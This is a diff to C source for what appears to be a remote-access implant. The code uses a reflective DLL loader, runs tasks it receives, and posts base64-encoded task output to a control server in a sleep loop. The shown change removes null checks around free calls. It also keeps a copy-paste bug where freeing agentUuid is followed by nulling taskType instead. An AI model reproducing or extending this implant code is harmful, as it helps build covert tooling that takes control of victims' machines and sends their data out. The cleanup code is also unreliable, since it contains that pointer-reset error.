@@ -20,6 +20,8 @@
 static ESG_STD_API EsgStdApi = { 0 };
 static PESG_STD_API PEsgStdApi = &EsgStdApi;
 
+// TODO: replace the use of api as a parameter to different functions
+
 // TODO: Pass the name of the reflective loader as a parameter
 /*
 This function runs the function named "ReflectiveLoader" in a reflective dll
@@ -740,18 +742,9 @@ void myMain()
             ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, encodedExitOutput);
             PostRequest(api, wServer, port, pathSendTaskOutput, json);
 
-            if (pEsgStdDll->pBuffer)
-            {
-                ((FREE)api->free)(pEsgStdDll->pBuffer);
-            }
-            if (json)
-            {
-                ((FREE)api->free)(json);
-            }
-            if (task.taskParams)
-            {
-                ((FREE)api->free)(task.taskParams);
-            }
+            ((FREE)api->free)(pEsgStdDll->pBuffer);
+            ((FREE)api->free)(json);
+            ((FREE)api->free)(task.taskParams);
 
             ((EXITTHREAD)api->ExitThread)(0);
         }
@@ -786,54 +779,26 @@ void myMain()
         ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, b64EncodedOutput);
         PostRequest(api, wServer, port, pathSendTaskOutput, json);
 
-        // NOTE: You don't need to check for null?
-        if (task.taskId)
-        {
-            ((FREE)api->free)(task.taskId);
-            task.taskId = NULL;
-        }
-        if (task.taskParams)
-        {
-            ((FREE)api->free)(task.taskParams);
-            task.taskParams = NULL;
-        }
-        if (task.taskType)
-        {
-            ((FREE)api->free)(task.taskType);
-            task.taskType = NULL;
-        }
-        if (task.agentUuid)
-        {
-            ((FREE)api->free)(task.agentUuid);
-            task.taskType = NULL;
-        }
-        if (orgOutput)
-        {
-            ((FREE)api->free)(orgOutput);
-            orgOutput = NULL;
-        }
-        if (b64EncodedOutput)
-        {
-            ((FREE)api->free)(b64EncodedOutput);
-            b64EncodedOutput = NULL;
-        }
-        if (jsonResponse)
-        {
-            ((FREE)api->free)(jsonResponse);
-            jsonResponse = NULL;
-        }
-        if (json)
-        {
-            ((FREE)api->free)(json);
-            json = NULL;
-        }
+        ((FREE)api->free)(task.taskId);
+        task.taskId = NULL;
+        ((FREE)api->free)(task.taskParams);
+        task.taskParams = NULL;
+        ((FREE)api->free)(task.taskType);
+        task.taskType = NULL;
+        ((FREE)api->free)(task.agentUuid);
+        task.taskType = NULL;
+        ((FREE)api->free)(orgOutput);
+        orgOutput = NULL;
+        ((FREE)api->free)(b64EncodedOutput);
+        b64EncodedOutput = NULL;
+        ((FREE)api->free)(jsonResponse);
+        jsonResponse = NULL;
+        ((FREE)api->free)(json);
+        json = NULL;
 
         ((SLEEP)api->Sleep)(3000);
     }
-    if (pEsgStdDll->pBuffer)
-    {
-        ((FREE)api->free)(pEsgStdDll->pBuffer);
-        pEsgStdDll->pBuffer = NULL;
-    }
+    ((FREE)api->free)(pEsgStdDll->pBuffer);
+    pEsgStdDll->pBuffer = NULL;
 }
 
